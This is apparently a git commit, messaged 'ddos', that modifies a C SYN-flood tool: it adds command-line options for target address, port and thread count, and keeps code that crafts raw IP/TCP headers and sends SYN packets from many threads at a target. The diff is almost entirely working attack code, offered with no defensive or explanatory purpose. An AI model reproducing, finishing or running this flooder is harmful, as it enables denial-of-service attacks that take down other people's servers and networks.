3e31bdedda53104f381506123e0ef335cd081615
Vecnik <Ve_cni_k@inbox.ru>
2017-10-29 15:51:23 +0700

    ddos

--- syn-flood.c
+++ syn-flood.c
@@ -1,3 +1,20 @@
+#include <stdio.h>
+#include <ctype.h>
+#include <unistd.h>
+#include <fcntl.h>
+#include <signal.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <sys/socket.h>
+#include <string.h>
+#include <netdb.h>
+#include <errno.h>
+#include <stdlib.h>
+#include <time.h> 
+#include <arpa/inet.h>
+#include <pthread.h>
+#include <getopt.h>
+
 #include "syn-flood.h"
 
 int raw_sock = 0;
@@ -5,39 +22,58 @@ static int alive = -1;
 
 char dst_ip[20] = { 0 };
 int dst_port;
+char src_dst_ip[100] = { 0 };
 
-typedef struct ip_hdr {
-	unsigned char       hl;
-	unsigned char       tos;
-	unsigned short      total_len;
-	unsigned short      id;
-	unsigned short      frag_and_flags;
-	unsigned char       ttl;
-	unsigned char       proto;
-	unsigned short      checksum;
-	unsigned int        src_ip;
-	unsigned int        dest_ip;
-} ip_hdr;
+void print_options_programm()
+{
+	printf("-h help\n");
+}
 
-typedef struct tcp_hdr {
- 	unsigned short      src_port;
- 	unsigned short      dest_port;
-	unsigned int        seq;
-	unsigned int        ack;
-	unsigned char       lenres;
- 	unsigned char       flag;
-	unsigned short      win;
-	unsigned short      sum;
-	unsigned short      urp;
-} tcp_hdr;
+int set_options(int argc, char **argv)
+{
+	int val_thread = MAXCHILD;
+	struct option opts[] = {
+    {"help", no_argument, 0, 'h'},
+    {"addr", required_argument, 0, 'a'},
+    {"port", required_argument, 0, 'p'},
+    {"thread", required_argument, 0, 't'},
+    {0,0,0,0},
+    };
+	int c;
+	while ((c = getopt(argc, argv, "ha:p:t:")) != -1) {
+    	switch (c) {
+			case 'a':
+				strcpy(src_dst_ip, optarg);
+				break;
+      
+			case 'h':
+				print_options_programm();
+				return 0;
+      
+			case 'p':
+				dst_port = atoi(optarg);
+				break;
 
-typedef struct fake_hdr {
-	unsigned int 		src_addr;
-	unsigned int 		dest_addr;
-	char				zero;
-	char				protocol;
-	unsigned short		len;
-} fake_hdr;
+			case 't':
+				val_thread = atoi(optarg);
+				break;
+
+			case '?':
+				if (optopt == 'c')
+					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
+				else if (isprint (optopt))
+					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
+				else
+					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
+				return 0;
+			
+			default:
+				abort ();
+		}
+	}
+
+	return val_thread;
+}
 
 unsigned short checksum(unsigned short *ptr, int n_bytes) 
 {
@@ -68,7 +104,7 @@ void init_header(ip_hdr *ip, tcp_hdr *tcp, fake_hdr *fake)
 {
   int len = sizeof(ip_hdr) + sizeof(tcp_hdr);
 	/* IP заполняем заголовок */
-	ip->hl = (4<<4 | sizeof(ip_hdr)/sizeof(unsigned int));
+	ip->hl = (4 << 4 | sizeof(ip_hdr)/sizeof(unsigned int));
 	ip->tos = 0;
 	ip->total_len = htons(len);
 	ip->id = 1;
@@ -101,7 +137,7 @@ void init_header(ip_hdr *ip, tcp_hdr *tcp, fake_hdr *fake)
 void send_ddos_packet(struct sockaddr_in *addr)
 { 
 	char buf[BUF_SIZE];
-	char sendbuf[BUF_SIZE];
+	char send_buf[BUF_SIZE];
 	int len;
 	ip_hdr ip;
 	tcp_hdr tcp;
@@ -125,12 +161,12 @@ void send_ddos_packet(struct sockaddr_in *addr)
     memcpy(buf + sizeof(fake_hdr), &tcp, sizeof(tcp_hdr));
     tcp.sum = checksum((u_short *) buf, sizeof(fake_hdr) + sizeof(tcp_hdr));
 
-    memset(sendbuf, '\0', sizeof(sendbuf));
-    memcpy(sendbuf, &ip, sizeof(ip));
-    memcpy(sendbuf + sizeof(ip), &tcp, sizeof(tcp_hdr));
-    printf("ddos packet");
-
-    if (sendto(raw_sock, sendbuf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr)) < 0) {
+    memset(send_buf, '\0', sizeof(send_buf));
+    memcpy(send_buf, &ip, sizeof(ip));
+    memcpy(send_buf + sizeof(ip), &tcp, sizeof(tcp_hdr));
+    printf(".\n");
+    
+    if (sendto(raw_sock, send_buf, len, 0, (struct sockaddr *) addr, sizeof(struct sockaddr)) < 0) {
       perror("sendto()");
       pthread_exit("fail");
     }
@@ -148,17 +184,18 @@ int main(int argc, char *argv[])
 	struct sockaddr_in addr;
 	struct hostent * host = NULL;
 
+	int n_pthread = set_options(argc, argv);
+	if (!n_pthread)
+		return 1;
+
 	int on = 1;
 	int i = 0;
 	int err = -1;
-	pthread_t pthread[MAXCHILD];
-
+	pthread_t pthread[n_pthread];
+	
 	alive = 1;
 	/* CTRL+C */
 	signal(SIGINT, sig_int);
-
-	strncpy(dst_ip, argv[1], 16);
-	dst_port = atoi(argv[2]);
 
 	memset(&addr, '\0', sizeof(addr));
 
@@ -166,12 +203,11 @@ int main(int argc, char *argv[])
 	addr.sin_port = htons(dst_port);
 
 	if (inet_addr(dst_ip) == INADDR_NONE) {
-    /* 为DNS地址，查询并转换成IP地址 */
-    host = gethostbyname(argv[1]);
-    if(host == NULL) {
-      perror("gethostbyname()");
-      exit(1);
-    }
+    	host = gethostbyname(src_dst_ip);
+    	if(host == NULL) {
+      		perror("gethostbyname()");
+      		exit(1);
+   		}
 	addr.sin_addr = *((struct in_addr*)(host->h_addr));
     strncpy(dst_ip, inet_ntoa(addr.sin_addr), 16);
 } else {
@@ -185,20 +221,21 @@ if (dst_port < 0 || dst_port > 65535) {
 
 	printf("host ip=%s\n", inet_ntoa(addr.sin_addr));
 
-	raw_sock = socket (AF_INET, SOCK_RAW, IPPROTO_TCP);
+	raw_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
 	if (raw_sock < 0) {
 		perror("socket()");
 		exit(1);
-}
+	}
 
-	if (setsockopt (raw_sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on)) < 0) {
+	err = setsockopt(raw_sock, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof (on));
+	if (err < 0) {
 		perror("setsockopt()");
 		exit(1);
-}
+	}
 
 	setuid(getpid());
 
-	for(i = 0; i < MAXCHILD; i++) {
+	for(i = 0; i < n_pthread; i++) {
 		err = pthread_create(&pthread[i], NULL, send_ddos_packet, &addr);
     
     	if(err != 0) {
@@ -207,7 +244,7 @@ if (dst_port < 0 || dst_port > 65535) {
 		}
 	}
 
-	for(i = 0; i < MAXCHILD; i++) {
+	for(i = 0; i < n_pthread; i++) {
     	err = pthread_join(pthread[i], NULL);
     	if(err != 0) {
 			perror("pthread_join Error\n");
--- syn-flood.h
+++ syn-flood.h
@@ -1,18 +1,41 @@
-#include <stdio.h>
-#include <ctype.h>
-#include <unistd.h>
-#include <fcntl.h>
-#include <signal.h>
-#include <sys/time.h>
-#include <sys/types.h>
-#include <sys/socket.h>
-#include <string.h>
-#include <netdb.h>
-#include <errno.h>
-#include <stdlib.h>
-#include <time.h> 
-#include <arpa/inet.h>
+#ifndef SYN_FLOOD_H
+#define SYN_FLOOD_H
 
 /* количество потоков по умолчанию */
 #define MAXCHILD 128
 #define BUF_SIZE 100
+
+typedef struct ip_hdr {
+	unsigned char       hl;
+	unsigned char       tos;
+	unsigned short      total_len;
+	unsigned short      id;
+	unsigned short      frag_and_flags;
+	unsigned char       ttl;
+	unsigned char       proto;
+	unsigned short      checksum;
+	unsigned int        src_ip;
+	unsigned int        dest_ip;
+} ip_hdr;
+
+typedef struct tcp_hdr {
+ 	unsigned short      src_port;
+ 	unsigned short      dest_port;
+	unsigned int        seq;
+	unsigned int        ack;
+	unsigned char       lenres;
+ 	unsigned char       flag;
+	unsigned short      win;
+	unsigned short      sum;
+	unsigned short      urp;
+} tcp_hdr;
+
+typedef struct fake_hdr {
+	unsigned int 		src_addr;
+	unsigned int 		dest_addr;
+	char				zero;
+	char				protocol;
+	unsigned short		len;
+} fake_hdr;
+
+#endif	/* SYN_FLOOD_H */
